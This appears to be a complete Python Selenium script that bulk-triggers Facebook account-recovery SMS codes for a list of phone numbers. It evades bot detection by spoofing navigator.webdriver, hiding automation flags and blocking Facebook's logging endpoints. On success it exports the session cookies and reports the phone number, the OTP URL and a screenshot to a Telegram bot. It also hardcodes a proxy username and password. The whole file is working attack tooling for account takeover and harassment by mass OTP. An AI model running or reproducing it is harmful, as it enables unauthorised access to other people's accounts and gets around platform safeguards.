"""
Facebook OTP Local Automation (Windows + Bright Data Proxy)
============================================================
Uses Selenium automation with Bright Data Residential Proxy.
No VPN needed - uses proxy for IP rotation.

Designed for: Windows Local Usage
Credits: Doctor Kayf (@Doc_kayf) adapted for Local PC
"""

import sys
import os
import time
import re
import random
import threading
from datetime import datetime
import json

# Debug print to confirm script start
print("[DEBUG] fb_otp_local.py initialization started...", flush=True)

# Suppress annoying warnings from selenium-wire
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*PermissionError.*")
import logging
logging.getLogger('seleniumwire').setLevel(logging.ERROR)
logging.getLogger('hpack').setLevel(logging.ERROR)
logging.getLogger('urllib3').setLevel(logging.ERROR)

# Suppress cffi callback exceptions (PermissionError spam)
import sys
import os

class StderrFilter:
    def __init__(self, original):
        self.original = original
        self.buffer = ""
    
    def write(self, text):
        # Filter out the annoying cffi/PermissionError messages
        if "cffi callback" in text or "PermissionError" in text or "nllMonFltProxy" in text:
            return
        self.original.write(text)
    
    def flush(self):
        self.original.flush()

sys.stderr = StderrFilter(sys.stderr)

try:
    import requests
    import io
    # Use seleniumwire for proxy support
    from seleniumwire import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, NoSuchElementException
    SELENIUMWIRE_AVAILABLE = True  # Enabled for proxy
    print("[DEBUG] Essential libraries imported successfully (WITH PROXY).", flush=True)
except ImportError as e:
    print(f"[ERROR] Missing dependency: {e}", flush=True)
    print("Please run: pip install selenium-wire", flush=True)
    sys.exit(1)

try:
    from webdriver_manager.chrome import ChromeDriverManager
    print("[DEBUG] webdriver_manager imported.", flush=True)
except ImportError:
    ChromeDriverManager = None
    print("[DEBUG] webdriver_manager not found, using system chromedriver.", flush=True)

# Fix console encoding
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

# Colors
class C:
    B = '\033[94m'
    G = '\033[92m'
    Y = '\033[93m'
    R = '\033[91m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def log(msg, level="INFO"):
    t = datetime.now().strftime("%H:%M:%S")
    colors = {"INFO": C.B, "OK": C.G, "WARN": C.Y, "ERROR": C.R, "SUCCESS": C.G + C.BOLD}
    c = colors.get(level, "")
    print(f"{C.CYAN}[{t}]{C.END} {c}[{level}] {msg}{C.END}", flush=True)

class FacebookOTPBrowser:
    # Decodo US Proxy Configuration
    PROXY_CONFIG = {
        'host': 'us.decodo.com',
        'port': '10001',
        'username': 'user-sp4069vjw2-sessionduration-1',
        'password': 'dIoV3E6juxt7If9hn_'
    }
    
    def __init__(self, headless=False):
        self.driver = None
        self.headless = headless
        self.wait_time = 15
        self.current_phone = None
        self.telegram_token = os.environ.get("TELEGRAM_TOKEN")
        self.telegram_chat_id = os.environ.get("TELEGRAM_CHAT_ID")
        self.cookie_handled = False

    def _setup_driver(self):
        log("Setting up Chrome browser (Data Saving Mode)...")
        options = Options()
        
        # 1. Environment & Basic Config
        if self.headless:
            options.add_argument("--headless=new")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")

        # 2. Chrome Binary Detection (Heroku Chrome for Testing)
        chrome_bin = None
        heroku_chrome = "/app/.chrome-for-testing/chrome-linux64/chrome"
        if os.path.exists(heroku_chrome):
            chrome_bin = heroku_chrome
        elif os.environ.get("GOOGLE_CHROME_BIN"):
            chrome_bin = os.environ.get("GOOGLE_CHROME_BIN")
        else:
            # Try common paths
            for p in ["/app/.apt/usr/bin/google-chrome", "/usr/bin/google-chrome"]:
                if os.path.exists(p):
                    chrome_bin = p
                    break
        
        if chrome_bin:
            options.binary_location = chrome_bin
            log(f"Using Chrome Binary: {chrome_bin}")
        else:
            log("WARNING: Chrome binary not found, using default", "WARN")


        # 2. Aggressive Data Saving & Background Traffic Blocking
        options.add_argument("--blink-settings=imagesEnabled=false")
        options.add_argument("--disable-remote-fonts")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-software-rasterizer")
        options.add_argument("--disk-cache-size=0")
        
        # Disable Chrome internal leaks (Optimization Guide, Autofill, Sync)
        options.add_argument("--disable-features=OptimizationHints,OptimizationGuideModelDownloading,OptimizationTargetPrediction,AutofillServerCommunication")
        options.add_argument("--disable-component-update")
        options.add_argument("--disable-search-geolocation-disclosure")
        options.add_argument("--disable-signin-scoped-device-id")
        options.add_argument("--disable-save-password-bubble")
        options.add_argument("--disable-background-networking")
        options.add_argument("--disable-default-apps")
        options.add_argument("--no-pings")

        # 3. User Agent & Window (Old Mobile for mbasic)
        old_mobile_ua = "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"
        options.add_argument(f"user-agent={old_mobile_ua}")
        options.add_argument("--window-size=360,640")
        options.add_argument("--lang=en-US")
        
        # 4. SSL Handling
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--ignore-ssl-errors=yes")
        
        # 5. Experimental Preferences
        options.add_experimental_option("prefs", {
            "profile.managed_default_content_settings.images": 2,
            "profile.managed_default_content_settings.stylesheets": 2,
            "profile.managed_default_content_settings.fonts": 2,
            "profile.managed_default_content_settings.plugins": 2,
            "profile.managed_default_content_settings.javascript": 1,
        })
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # 6. Block external JavaScript files (keep inline)
        options.add_argument("--disable-javascript-harmony-shipping")

        # 7. Page Load Strategy (NONE - fastest)
        options.page_load_strategy = 'none'
        log("🚀 Page load strategy: NONE (ultra-fast)", "OK")

        # SOAX Proxy Configuration (USA)
        # PROXY DISABLED - Local testing
        # proxy = self.PROXY_CONFIG
        # proxy_url = f"http://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
        
        seleniumwire_options = {
            # 'proxy': {
            #     'http': proxy_url,
            #     'https': proxy_url,
            #     'no_proxy': 'localhost,127.0.0.1'
            # },
            'verify_ssl': False,
            'connection_timeout': 60,
            'request_timeout': 60
        }
        
        log(f"🌐 NO PROXY - Direct local connection", "OK")

        try:
            # Priority 1: Heroku Chrome for Testing chromedriver
            heroku_chromedriver = "/app/.chrome-for-testing/chromedriver-linux64/chromedriver"
            env_chromedriver = os.environ.get("CHROMEDRIVER_PATH")
            
            service = None
            if os.path.exists(heroku_chromedriver):
                log(f"Using Heroku ChromeDriver: {heroku_chromedriver}")
                os.chmod(heroku_chromedriver, 0o755)
                service = Service(heroku_chromedriver)
            elif env_chromedriver and os.path.exists(env_chromedriver):
                log(f"Using ENV ChromeDriver: {env_chromedriver}")
                service = Service(env_chromedriver)
            elif ChromeDriverManager:
                log("Using ChromeDriverManager to install chromedriver")
                service = Service(ChromeDriverManager().install())
            else:
                log("Using system chromedriver (no explicit path)", "WARN")
            
            if service:
                self.driver = webdriver.Chrome(service=service, options=options, seleniumwire_options=seleniumwire_options)
            else:
                self.driver = webdriver.Chrome(options=options, seleniumwire_options=seleniumwire_options)
            
            # === SELENIUMWIRE REQUEST INTERCEPTOR - Block BEFORE fetching ===
            def request_interceptor(request):
                # Block by file extension (images, css, fonts, media)
                blocked_extensions = ('.png', '.jpg', '.jpeg', '.gif', '.webp', '.svg', '.ico', '.bmp',
                                     '.css', '.woff', '.woff2', '.ttf', '.eot', '.otf',
                                     '.mp4', '.webm', '.mp3', '.wav', '.ogg', '.avi',
                                     '.pdf', '.zip', '.rar')
                
                # Block by domain/path
                blocked_patterns = (
                    'static.xx.fbcdn.net', 'scontent', 'rsrc.php', 'emoji', 'sprite',
                    'google-analytics', 'googletagmanager', 'facebook.com/tr',
                    'pixel', 'analytics', 'tracking', 'beacon', 'connect.facebook.net',
                    'measurement', 'insights', 'ads', 'doubleclick',
                    'googleapis.com', 'clients.google.com', 'google.com',
                    'optimizationguide', 'content-autofill', 'mtalk.google.com',
                    'bootloader', 'banzai', 'logging'
                    # Removed: 'graphql', 'ajax/bz', 'webrtc', 'websocket' - needed for OTP
                )
                
                url = request.url.lower()
                
                # Block by extension
                if any(url.endswith(ext) for ext in blocked_extensions):
                    request.abort()
                    return
                
                # Block by pattern
                if any(pattern in url for pattern in blocked_patterns):
                    request.abort()
                    return
            
            self.driver.request_interceptor = request_interceptor
            log("🛡️ Request Interceptor activated (blocks before fetch)", "OK")
            
            # Timeouts
            self.driver.set_page_load_timeout(60)
            self.driver.set_script_timeout(30)
            self.wait = WebDriverWait(self.driver, 20)
            
            # === MAXIMUM DATA SAVING - Block EVERYTHING except essential ===
            self.driver.execute_cdp_cmd("Network.enable", {})
            
            # Block ALL resource types at CDP level (STRICTEST rules)
            self.driver.execute_cdp_cmd("Network.setBlockedURLs", {
                "urls": [
                    # Images - ALL formats
                    "*.png", "*.jpg", "*.jpeg", "*.gif", "*.webp", "*.svg", "*.ico", "*.bmp", "*.tiff",
                    # Styles & Fonts
                    "*.css", "*.woff", "*.woff2", "*.ttf", "*.eot", "*.otf", "*.font",
                    # Media
                    "*.mp4", "*.webm", "*.mp3", "*.wav", "*.ogg", "*.avi", "*.mov",
                    # Documents
                    "*.pdf", "*.zip", "*.rar", "*.doc", "*.docx",
                    # ALL Facebook static resources
                    "*static.xx.fbcdn.net*",
                    "*scontent*.fbcdn.net*",
                    "*rsrc.php*",
                    "*emoji*",
                    "*sprite*",
                    # ALL JavaScript (except essential)
                    "*bootloader*js*",
                    "*banzai*",
                    "*logging*",
                    "*beacon*",
                    # Analytics & Tracking
                    "*google-analytics*", "*googletagmanager*", 
                    "*facebook.com/tr*", "*fbevents*",
                    "*pixel*", "*analytics*", "*tracking*", "*beacon*",
                    "*connect.facebook.net*", "*/ajax/bz*",
                    "*measurement*", "*insights*",
                    # Ads & External
                    "*ads*", "*adserver*", "*doubleclick*",
                    "*i.facebook.com*",
                    # Google Services (NEW - Based on traffic analysis)
                    "*googleapis.com*",
                    "*clients.google.com*", 
                    "*android.clients.google.com*",
                    "*accounts.google.com*",
                    "*google.com*",
                    # Chrome Internal Traffic (Strong Explicit Blocks)
                    "*optimizationguide*",
                    "*content-autofill*",
                    "*mtalk.google.com*",
                    # API calls we don't need
                    "*/ajax/bootloader*",
                    "*/ajax/haste*",
                    "*/ajax/qm*",
                    "*/ajax/common*"
                    # Removed: webrtc, websocket, graphql - needed for OTP
                ]
            })
            log("🚫 MAXIMUM DATA BLOCKING enabled", "OK")
            
            # Inject anti-detect scripts
            self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": "Object.defineProperty(navigator, 'webdriver', { get: () => undefined });"
            })
            
            log("Chrome browser initialized successfully", "OK")
            
            # IP verification removed to save data
            
            return True
        except Exception as e:
            log(f"Failed to setup Chrome: {e}", "ERROR")
            return False

    def _save_step_screenshot(self, step_name):
        """Save screenshot for each step"""
        try:
            filename = f"step_{step_name}_{int(time.time())}.png"
            self.driver.save_screenshot(filename)
            log(f"📸 Screenshot saved: {filename}", "INFO")
            return filename
        except Exception as e:
            log(f"Failed to save screenshot: {e}", "WARN")
            return None

    def send_telegram_photo(self, caption, file_path):
        if not self.telegram_token or not self.telegram_chat_id:
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendPhoto"
            with open(file_path, "rb") as f:
                files = {"photo": f}
                data = {"chat_id": self.telegram_chat_id, "caption": caption}
                response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                log("Telegram notification sent!", "OK")
            else:
                log(f"Failed to send Telegram: {response.text}", "WARN")
        except Exception as e:
            log(f"Error sending Telegram: {e}", "WARN")

    def send_telegram_document(self, caption, file_path):
        """Send a document (like cookies JSON) via Telegram"""
        if not self.telegram_token or not self.telegram_chat_id:
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": self.telegram_chat_id, "caption": caption}
                response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                log(f"📄 Telegram document sent: {file_path}", "OK")
            else:
                log(f"Failed to send Telegram document: {response.text}", "WARN")
        except Exception as e:
            log(f"Error sending Telegram document: {e}", "WARN")

    def _handle_cookie_consent(self):
        try:
            js_click = """
            (function() {
                let spans = [...document.querySelectorAll('span')];
                let target = spans.find(s => s.innerText === 'Allow all cookies' || s.innerText.includes('السماح'));
                if (target) { target.click(); return true; }
                return false;
            })();
            """
            if self.driver.execute_script(js_click):
                log("Cookie consent accepted", "OK")
                time.sleep(1)
        except: pass


    def run_flow_reuse(self, phone):
        """Reuse existing browser (for persistent mode) - keeps browser open for cookie retrieval"""
        return self.run_flow(phone, keep_open=True)

    def run_flow(self, phone, keep_open=False):
        self.current_phone = phone
        log(f"Starting OTP flow for {phone} (DATA SAVER MODE)")
        
        if not self._setup_driver():
            return False
        
        try:
            # 1. Open mbasic Facebook (IP check removed to save time)
            # 1. Open mbasic Facebook
            recovery_url = 'https://mbasic.facebook.com/login/identify/?ctx=recover'
            log(f"Opening: {recovery_url}", "INFO")
            self.driver.get(recovery_url)
            # mbasic is lightweight, can force stop early
            self.driver.execute_script("window.stop();")
            log("⏳ Waiting for mbasic to load...", "INFO")
            time.sleep(1.5)  # Reduced from 3

            # 2. Enter Phone
            # mbasic uses different element structure
            inp = None
            # Try different selectors for mbasic
            for selector in ["input[name='email']", "#identify_email", "input[type='text']"]:
                try:
                    inp = WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    if inp:
                        break
                except:
                    continue
            
            if not inp:
                self._save_step_screenshot("error_no_input")
                log("Could not find phone input field", "ERROR")
                return False
                
            inp.clear()
            inp.send_keys(phone)
            log("Phone entered, submitting...", "INFO")
            
            # Find and click submit button
            try:
                submit_btn = self.driver.find_element(By.CSS_SELECTOR, "input[type='submit'], button[type='submit']")
                submit_btn.click()
                # Short sleep then stop
                time.sleep(1)  # Reduced from 1.5
                self.driver.execute_script("window.stop();")
                log("🛑 Force stopped after submit", "OK")
            except:
                inp.send_keys(Keys.ENTER)
                time.sleep(1)  # Reduced from 1.5
                self.driver.execute_script("window.stop();")
            
            # Quick early check for "not found" - FAST PATH
            time.sleep(0.5)  # Reduced from 1
            quick_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            if "doesn't match" in quick_text or "try again or create" in quick_text or "no search results" in quick_text:
                log("⚡ Account NOT FOUND (early detection)", "WARN")
                return False
            
            # Wait for page to load after search
            time.sleep(1)  # Reduced from 2
            
            log("Search completed, processing results...", "INFO")

            # 3. Handle Results
            url = self.driver.current_url
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            
            log(f"Current URL: {url}", "INFO")

            if "no search results" in page_text or "لم يتم العثور" in page_text or "doesn't match an account" in page_text or "try again or create" in page_text:
                log("❌ Account NOT FOUND for this number", "WARN")
                return False

            # Handle "Is this your account?" page - click "Yes, Continue" (CHECK FIRST!)
            # This page has text like "closely matches" and a blue button
            if "is this your account" in page_text or "هل هذا حسابك" in page_text or "closely matches" in page_text or "found one that" in page_text:
                log("🔍 'Is this your account?' page detected", "INFO")
                clicked = False
                try:
                    # Method 1: Look for blue submit button (most reliable)
                    submit_btns = self.driver.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit']")
                    for btn in submit_btns:
                        try:
                            btn.click()
                            clicked = True
                            log(f"✅ Clicked submit button for 'Yes, Continue'", "OK")
                            break
                        except:
                            continue
                    
                    # Method 2: Look for button/link with text
                    if not clicked:
                        elements = self.driver.find_elements(By.CSS_SELECTOR, "button, a, input[type='button']")
                        for el in elements:
                            el_text = el.text.strip().lower()
                            if "yes" in el_text or "continue" in el_text or "نعم" in el_text or "متابعة" in el_text:
                                el.click()
                                clicked = True
                                log(f"✅ Clicked: '{el.text}'", "OK")
                                break
                    
                    if clicked:
                        time.sleep(1.5)  # Reduced from 2
                        self.driver.execute_script("window.stop();")
                except Exception as e:
                    log(f"Could not click Yes Continue: {e}", "WARN")
                
                # Refresh page text after click
                time.sleep(0.5)  # Reduced from 1
                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()

            # Handle "Choose Your Account" page - select account matching our phone number
            if "choose your account" in page_text or "اختر حسابك" in page_text:
                log("🔍 Multiple accounts found - looking for matching phone...", "INFO")
                
                # Get last 2 digits to match
                phone_last_2 = self.current_phone[-2:] if self.current_phone else ""
                log(f"Looking for account ending in: {phone_last_2}", "INFO")
                
                try:
                    # Find all links that look like phone numbers
                    account_links = self.driver.find_elements(By.CSS_SELECTOR, "a")
                    matched_link = None
                    first_phone_link = None
                    
                    for link in account_links:
                        link_text = link.text.strip()
                        # Skip "Back" link and empty links
                        if link_text and link_text.lower() != "back" and ("+" in link_text or any(c.isdigit() for c in link_text)):
                            # Save first valid link as fallback
                            if not first_phone_link:
                                first_phone_link = link
                            
                            # Check if this link ends with our phone's last 2 digits
                            if phone_last_2 and phone_last_2 in link_text:
                                matched_link = link
                                log(f"✅ Found matching account: {link_text}", "OK")
                                break
                    
                    # Use matched link, or fallback to first if no match
                    selected_link = matched_link or first_phone_link
                    if selected_link:
                        selected_link.click()
                        log(f"✅ Selected account: {selected_link.text.strip()}", "OK")
                        time.sleep(1.5)  # Reduced from 2
                        self.driver.execute_script("window.stop();")
                    else:
                        log("No phone account found to select", "WARN")
                        
                except Exception as e:
                    log(f"Could not select account: {e}", "WARN")
                
                # Wait and refresh page text after selection
                time.sleep(1)  # Reduced from 2
                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
                
                if "is this your account" in page_text or "هل هذا حسابك" in page_text or "closely matches" in page_text or "found one that" in page_text:
                    log("🔍 'Is this your account?' page detected (after account selection)", "INFO")
                    clicked = False
                    try:
                        # Method 1: Look for submit button (blue button)
                        submit_btns = self.driver.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit']")
                        for btn in submit_btns:
                            try:
                                btn.click()
                                clicked = True
                                log(f"✅ Clicked 'Yes, Continue' submit button", "OK")
                                break
                            except:
                                continue
                        
                        # Method 2: Look for any element with yes/continue text
                        if not clicked:
                            elements = self.driver.find_elements(By.CSS_SELECTOR, "button, a, input[type='button'], div[role='button']")
                            for el in elements:
                                el_text = el.text.strip().lower()
                                if "yes" in el_text or "continue" in el_text or "نعم" in el_text or "متابعة" in el_text:
                                    el.click()
                                    clicked = True
                                    log(f"✅ Clicked: '{el.text}'", "OK")
                                    break
                        
                        if clicked:
                            time.sleep(1.5)  # Reduced from 2
                            self.driver.execute_script("window.stop();")
                            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
                    except Exception as e:
                        log(f"Could not click Yes Continue: {e}", "WARN")

            # Try clicking "Try another way" or similar links
            # This is needed when page shows login instead of recovery options
            try_another_clicked = False
            try_another_keywords = [
                "Try another way", "try another way",
                "Forgot password", "forgot password", 
                "Can't access", "can't access",
                "No longer have access", "no longer have access",
                "طريقة أخرى", "نسيت كلمة السر"
            ]
            
            # Method 1: Try by link text
            for keyword in try_another_keywords:
                try:
                    btn = self.driver.find_element(By.PARTIAL_LINK_TEXT, keyword)
                    btn.click()
                    try_another_clicked = True
                    log(f"Clicked: '{keyword}'", "OK")
                    time.sleep(1.5)  # Reduced from 3
                    break
                except:
                    continue
            
            # Method 2: Try by text content in any clickable element
            if not try_another_clicked:
                try:
                    links = self.driver.find_elements(By.TAG_NAME, "a")
                    for link in links:
                        link_text = link.text.lower()
                        if any(kw.lower() in link_text for kw in try_another_keywords):
                            link.click()
                            try_another_clicked = True
                            log(f"Clicked link with text: '{link.text}'", "OK")
                            time.sleep(1.5)  # Reduced from 3
                            break
                except:
                    pass
            
            if not try_another_clicked:
                log("No 'Try another way' link found, continuing...", "INFO")

            # 4. Select SMS and Send
            time.sleep(1)
            self.driver.execute_script("window.stop();")
            log("🛑 Force stopped before SMS check", "OK")
            time.sleep(1)  # Wait for page to fully load
            try:
                page_source = self.driver.page_source.lower()
                log(f"Looking for SMS option on recovery page...", "INFO")
                
                # Get last digits of the phone number for matching (try 2, then 1)
                phone_last_2 = self.current_phone[-2:] if self.current_phone else ""
                phone_last_1 = self.current_phone[-1:] if self.current_phone else ""
                log(f"Phone last 2 digits: {phone_last_2}, last 1 digit: {phone_last_1}", "INFO")
                
                # Method 1: Find SMS radio buttons - IMPROVED to match phone number
                radios = self.driver.find_elements(By.CSS_SELECTOR, "input[type='radio']")
                log(f"Found {len(radios)} radio buttons", "INFO")
                
                sms_found = False
                best_match_radio = None
                good_match_radio = None  # For single digit match
                
                for i, r in enumerate(radios):
                    outer_html = r.get_attribute("outerHTML").lower()
                    parent_text = ""
                    grandparent_text = ""
                    try:
                        parent = r.find_element(By.XPATH, "./..")
                        parent_text = parent.text.lower()
                        grandparent = parent.find_element(By.XPATH, "./..")
                        grandparent_text = grandparent.text.lower()
                    except:
                        pass
                    
                    # Full text to search
                    full_text = f"{outer_html} {parent_text} {grandparent_text}"
                    
                    # Log each option for debugging
                    option_text = parent_text or grandparent_text
                    log(f"Radio {i+1}: {option_text[:80]}...", "INFO")
                    
                    # Check if this is an SMS option
                    is_sms = "sms" in full_text or "send code via sms" in full_text or "text" in full_text
                    
                    # Check for phone match - try 2 digits, then 1 digit
                    matches_2_digits = phone_last_2 and phone_last_2 in full_text
                    matches_1_digit = phone_last_1 and full_text.rstrip().endswith(phone_last_1)
                    
                    if is_sms and matches_2_digits:
                        # Perfect match - SMS option that matches last 2 digits
                        self.driver.execute_script("arguments[0].click();", r)
                        sms_found = True
                        log(f"✅ SMS option found matching phone ending in {phone_last_2}!", "OK")
                        break
                    elif is_sms and matches_1_digit and not good_match_radio:
                        # Good match - matches last digit
                        good_match_radio = r
                    elif is_sms and not best_match_radio:
                        # Store first SMS option as backup
                        best_match_radio = r
                
                # Priority: exact 2-digit match > 1-digit match > first SMS option
                if not sms_found and good_match_radio:
                    self.driver.execute_script("arguments[0].click();", good_match_radio)
                    sms_found = True
                    log(f"✅ SMS option found matching phone ending in {phone_last_1}!", "OK")
                elif not sms_found and best_match_radio:
                    self.driver.execute_script("arguments[0].click();", best_match_radio)
                    sms_found = True
                    log(f"SMS option found (fallback - no exact phone match)", "OK")
                
                # Method 2: Look for clickable elements with SMS text and phone match
                if not sms_found:
                    clickable = self.driver.find_elements(By.CSS_SELECTOR, "div[role='button'], span, label, td, a")
                    for el in clickable:
                        el_text = el.text.lower()
                        # Check for SMS + phone match
                        if ("sms" in el_text or "send code via sms" in el_text) and (phone_last_2 in el_text or not phone_last_2):
                            try:
                                el.click()
                                sms_found = True
                                log(f"SMS option found via element click", "OK")
                                break
                            except:
                                continue
                
                # ⚠️ If SMS not found - FAIL and stop
                if not sms_found:
                    self._save_step_screenshot("error_no_sms_option")
                    log("❌ SMS option NOT found - Cannot send OTP!", "ERROR")
                    log("Available options do not include SMS/Text message", "WARN")
                    return False
                
                time.sleep(1)
                
                # Try to find and click the Continue/Send button
                try:
                    continue_btns = self.driver.find_elements(By.CSS_SELECTOR, 
                        "button[type='submit'], input[type='submit'], div[role='button']")
                    for btn in continue_btns:
                        btn_text = btn.text.lower()
                        if "continue" in btn_text or "send" in btn_text or "متابعة" in btn_text or "إرسال" in btn_text:
                            btn.click()
                            log("Clicked Continue/Send button", "OK")
                            time.sleep(1.5)  # Reduced from 2
                            # Stop immediately after click to prevent loading full next page
                            self.driver.execute_script("window.stop();")
                            log("🛑 Force stopped after Continue click", "OK")
                            time.sleep(2)  # Reduced from 3
                            break
                except:
                    # Fallback: try by name
                    try:
                        btn = self.driver.find_element(By.NAME, "reset_action")
                        btn.click()
                        log("Clicked reset_action button", "OK")
                        time.sleep(3)  # Reduced from 5
                    except:
                        pass
                
                # 5. Verify Success
                current_url = self.driver.current_url
                page_text = self.driver.page_source.lower()
                
                # Check success FIRST (recover/code means OTP was sent!)
                if "recover/code" in current_url or "enter code" in page_text or "enter the code" in page_text:
                    log("🎉 SUCCESS: OTP SENT!", "SUCCESS")
                    log(f"📱 OTP Entry URL: {current_url}", "INFO")
                    
                    # Export cookies for reuse
                    cookies = self.driver.get_cookies()
                    cookies_file = f"cookies_{phone.replace('+', '')}.json"
                    with open(cookies_file, 'w') as f:
                        json.dump(cookies, f)
                    log(f"🍪 Cookies saved to: {cookies_file}", "INFO")
                    
                    # Create a simple HTML to use cookies
                    cookie_string = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                    log(f"🍪 Cookie string for browser: {cookie_string[:100]}...", "INFO")
                    
                    self._save_step_screenshot("success_otp_page")
                    screenshot_path = f"success_{phone}.png"
                    self.driver.save_screenshot(screenshot_path)
                    
                    # Send via Telegram with cookies file
                    self.send_telegram_photo(
                        f"✅ OTP SENT!\nPhone: {phone}\n📱 OTP URL: {current_url}\n🍪 Cookies file: {cookies_file}", 
                        screenshot_path
                    )
                    
                    try:
                        os.remove(screenshot_path)
                    except:
                        pass
                    return True
                else:
                    self._save_step_screenshot("error_otp_not_verified")
                    log(f"Current URL after button click: {current_url}", "INFO")
                    log("❌ Could not verify OTP sent status", "ERROR")
                    return False
            except Exception as e:
                log(f"Error during SMS selection: {e}", "ERROR")
                return False

        except Exception as e:
            log(f"Flow Error: {e}", "ERROR")
        finally:
            # Only close browser if not keeping open for cookie retrieval
            if self.driver and not keep_open:
                if not self.headless:
                    print("\nWARNING: Browser ending paused. Press Enter to close browser...")
                    input()
                self.driver.quit()
        
        return False

def format_phone(phone):
    return re.sub(r'[^\d+]', '', phone).strip()

def main():
    if len(sys.argv) < 2:
        print("Usage: python fb_otp_local.py <phone_number_or_file> [--visible]")
        return

    target = sys.argv[1]
    headless = "--visible" not in sys.argv
    
    # Get numbers
    numbers = []
    if os.path.isfile(target):
        with open(target, 'r') as f:
            numbers = [format_phone(line) for line in f if line.strip()]
    else:
        numbers = [format_phone(target)]

    if not numbers:
        log("No valid numbers provided", "ERROR")
        return

    log(f"Total numbers to process: {len(numbers)}")
    log("Using Bright Data Residential Proxy (no VPN needed)", "OK")
    
    for phone in numbers:
        log(f"\n{'='*40}")
        log(f" PROCESSING: {phone}")
        log(f"{'='*40}")

        try:
            # Run OTP flow with proxy
            bot = FacebookOTPBrowser(headless=headless)
            bot.run_flow(phone)
        except Exception as e:
            log(f"Error processing {phone}: {e}", "ERROR")
        
        # Small delay between numbers
        if len(numbers) > 1:
            log("Waiting 3 seconds before next number...")
            time.sleep(3)

if __name__ == "__main__":
    main()



# Force update

